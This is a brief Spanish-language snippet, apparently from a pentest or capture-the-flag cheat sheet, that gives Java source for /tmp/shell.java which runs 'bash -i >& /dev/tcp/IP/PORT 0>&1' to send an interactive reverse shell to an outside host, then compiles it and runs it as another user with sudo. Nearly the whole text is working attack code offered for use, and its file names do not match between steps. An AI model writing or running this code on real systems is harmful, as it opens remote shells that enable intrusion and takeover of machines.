Crear el script /tmp/shell.java

```bash
import java.io.IOException;

public class shell {
    public static void main(String[] args) {
        try {
            // Comando para enviar una shell interactiva a 172.17.0.1 por el puerto 4444
            String cmd = "bash -i >& /dev/tcp/IP/PORT 0>&1";
            
            // Ejecutar el comando en la terminal
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
			
			// Esperar a que termine
            process.waitFor();
            
            System.out.println("Intento de establecer una shell reversa completado.");

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```

luego compilar, para después poner en escucha:

```bash
javac archivo.java
```

ejecutar:

```bash
sudo -u USER java archivo
```
